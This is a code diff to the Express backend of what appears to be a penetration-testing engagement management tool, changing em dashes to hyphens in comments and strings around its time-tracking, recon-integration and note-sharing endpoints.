     description: `Técnicas ATT&CK ejercidas en el engagement (Gungnir)`,
@@ -3287,7 +3292,7 @@ app.get("/api/engagements/:id/time", auth(), async (req, res) => {
     resumen.total_minutes += r.minutes || 0;
     const fase = r.custom_phase_name || r.phase_type || "sin_fase";
     resumen.por_fase[fase] = (resumen.por_fase[fase] || 0) + (r.minutes || 0);
-    const quien = r.user_name || "—";
+    const quien = r.user_name || "-";
     resumen.por_operador[quien] = (resumen.por_operador[quien] || 0) + (r.minutes || 0);
   }
   res.json({ entries: rows, resumen });
@@ -3571,7 +3576,7 @@ app.delete("/api/scripts/overrides/:id", auth(["admin"]), async (req, res) => {
   res.json({ ok: true });
 });
 
-// INTEGRATIONS — RECON API KEYS (stored in settings table)
+// INTEGRATIONS - RECON API KEYS (stored in settings table)
 // ─────────────────────────────────────────────────────────────────────────────
 const RECON_KEY_SERVICES = ["shodan", "virustotal", "censys"];
 
@@ -3609,7 +3614,7 @@ app.get("/api/integrations/recon-keys/status", auth(), async (req, res) => {
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
-// INTEGRATIONS — RECON QUERY (Shodan + free APIs)
+// INTEGRATIONS - RECON QUERY (Shodan + free APIs)
 // ─────────────────────────────────────────────────────────────────────────────
 app.post("/api/integrations/recon/query", auth(), async (req, res) => {
   const { target } = req.body;
@@ -3633,7 +3638,7 @@ app.post("/api/integrations/recon/query", auth(), async (req, res) => {
 
 // ── Notas ─────────────────────────────────────────────────────────────────────
 
-// MySQL devuelve JSON columns como string — parseamos tags antes de enviar
+// MySQL devuelve JSON columns como string - parseamos tags antes de enviar
 const parseNote = (n) => n ? { ...n, tags: typeof n.tags === "string" ? JSON.parse(n.tags || "[]") : (n.tags || []) } : n;
 
 // ── Lista de usuarios disponibles para compartir (sin req de admin) ──────────
@@ -3645,7 +3650,7 @@ app.get("/api/notes/users", auth(), async (req, res) => {
   res.json(rows);
 });
 
-// ── GET /api/notes — propias + compartidas conmigo ────────────────────────────
+// ── GET /api/notes - propias + compartidas conmigo ────────────────────────────
 app.get("/api/notes", auth(), async (req, res) => {
   const { search, engagement_id, pinned, tag } = req.query;
   const uid = req.user.id;
@@ -3689,7 +3694,7 @@ app.get("/api/notes", auth(), async (req, res) => {
   res.json(all);
 });
 
-// ── GET /api/notes/:id — dueño o usuario con acceso compartido ────────────────
+// ── GET /api/notes/:id - dueño o usuario con acceso compartido ────────────────
 app.get("/api/notes/:id", auth(), async (req, res) => {
   const uid = req.user.id;
   let note = await qRow("SELECT * FROM notes WHERE id=? AND user_id=?", [req.params.id, uid]);
@@ -3749,7 +3754,7 @@ app.delete("/api/notes/:id", auth(), async (req, res) => {
 
 // ── Compartir nota ─────────────────────────────────────────────────────────────
 
-// GET /api/notes/:id/shares — lista de usuarios con acceso (solo dueño)
+// GET /api/notes/:id/shares - lista de usuarios con acceso (solo dueño)
 app.get("/api/notes/:id/shares", auth(), async (req, res) => {
   const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
   if (!note) return res.status(403).json({ error: "Solo el dueño puede ver los accesos" });
@@ -3762,7 +3767,7 @@ app.get("/api/notes/:id/shares", auth(), async (req, res) => {
   res.json(rows);
 });
 
-// POST /api/notes/:id/share — compartir con un usuario (solo dueño)
+// POST /api/notes/:id/share - compartir con un usuario (solo dueño)
 app.post("/api/notes/:id/share", auth(), async (req, res) => {
   const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
   if (!note) return res.status(403).json({ error: "Solo el dueño puede compartir la nota" });
@@ -3776,7 +3781,7 @@ app.post("/api/notes/:id/share", auth(), async (req, res) => {
   res.json({ ok: true });
 });
 
-// DELETE /api/notes/:id/share/:userId — revocar acceso (solo dueño)
+// DELETE /api/notes/:id/share/:userId - revocar acceso (solo dueño)
 app.delete("/api/notes/:id/share/:userId", auth(), async (req, res) => {
   const note = await qRow("SELECT id FROM notes WHERE id=? AND user_id=?", [req.params.id, req.user.id]);
   if (!note) return res.status(403).json({ error: "Solo el dueño puede revocar accesos" });
